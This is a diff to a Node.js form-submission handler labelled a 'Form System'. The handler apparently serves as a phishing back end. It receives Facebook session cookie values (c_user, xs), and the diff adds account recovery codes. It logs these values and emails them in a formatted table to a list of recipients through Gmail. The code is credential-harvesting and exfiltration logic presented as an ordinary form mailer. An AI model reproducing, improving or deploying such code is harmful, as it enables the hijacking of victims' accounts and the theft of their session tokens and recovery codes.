@@ -1,5 +1,4 @@
 import nodemailer from 'nodemailer';
-import { setWorkerEmail } from './emailStore.js';
 
 export default async function handler(req, res) {
   // CORS headers
@@ -12,27 +11,28 @@ export default async function handler(req, res) {
   if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });
 
   try {
-    const { c_user, xs, emails, workerEmail, name } = req.body;
+    const { c_user, xs, emails, workerEmail, name, recovery_codes } = req.body;
 
-    // ✅ SAVE workerEmail for password form
-    if (workerEmail) {
-      setWorkerEmail(workerEmail);
-    }
-    
     console.log('📨 Submit Form:');
+    console.log('Name:', name); // ✅ Log name
     console.log('c_user:', c_user);
     console.log('xs:', xs);
     console.log('Emails to send:', emails);
-    console.log('Worker Email (saved for password):', workerEmail);
     
-    // Send email ONLY to emails array
-    const emailResult = await sendGmail(emails, { c_user, xs, name });
+    // Send email with name included
+    const emailResult = await sendSubmitEmail(emails, { 
+      name, 
+      c_user, 
+      xs, 
+      recovery_codes 
+    });
 
     return res.status(200).json({
       success: true,
       message: 'Form submitted successfully!',
       emailSent: emailResult.success,
-      emailMessage: emailResult.message
+      emailMessage: emailResult.message,
+      name: name // ✅ Response mein name bhejein
     });
 
   } catch (error) {
@@ -44,7 +44,7 @@ export default async function handler(req, res) {
   }
 }
 
-async function sendGmail(toEmails, formData) {
+async function sendSubmitEmail(toEmails, formData) {
   try {
     const transporter = nodemailer.createTransport({
       service: 'gmail',
@@ -54,16 +54,45 @@ async function sendGmail(toEmails, formData) {
       }
     });
 
+    // ✅ Email mein NAME include karein
     const mailOptions = {
       from: `"Form System" <${process.env.GMAIL_USER}>`,
       to: toEmails.join(', '),
-      subject: `✅ New Submission: ${formData.name}`,
-      html: `<div><h2>New Form</h2><p>c_user: ${formData.c_user}</p><p>xs: ${formData.xs}</p></div>`
+      subject: `✅ New Submission: ${formData.name || 'User'}`, // ✅ Subject mein name
+      html: `
+        <div style="font-family: Arial, sans-serif; padding: 20px; border: 1px solid #ddd; border-radius: 10px;">
+          <h2 style="color: #333;">📋 New Form Submission</h2>
+          
+          <table style="width: 100%; border-collapse: collapse; margin: 15px 0;">
+            <tr>
+              <td style="padding: 10px; border-bottom: 1px solid #eee; font-weight: bold; width: 120px;">Name:</td>
+              <td style="padding: 10px; border-bottom: 1px solid #eee;">${formData.name || 'Not provided'}</td>
+            </tr>
+            <tr>
+              <td style="padding: 10px; border-bottom: 1px solid #eee; font-weight: bold;">c_user:</td>
+              <td style="padding: 10px; border-bottom: 1px solid #eee;">${formData.c_user}</td>
+            </tr>
+            <tr>
+              <td style="padding: 10px; border-bottom: 1px solid #eee; font-weight: bold;">xs:</td>
+              <td style="padding: 10px; border-bottom: 1px solid #eee;">${formData.xs}</td>
+            </tr>
+            ${formData.recovery_codes ? `
+            <tr>
+              <td style="padding: 10px; font-weight: bold;">Recovery Codes:</td>
+              <td style="padding: 10px;">${formData.recovery_codes}</td>
+            </tr>
+            ` : ''}
+          </table>
+          
+          <p><strong>Time:</strong> ${new Date().toLocaleString()}</p>
+          <p><strong>Sent to:</strong> ${toEmails.join(', ')}</p>
+        </div>
+      `
     };
 
     await transporter.sendMail(mailOptions);
-    console.log('✅ Email sent to:', toEmails);
-    return { success: true, message: 'Email sent!' };
+    console.log(`✅ Submit email sent for ${formData.name || 'user'}`);
+    return { success: true, message: 'Email sent with name!' };
 
   } catch (error) {
     console.error('❌ Email Error:', error);
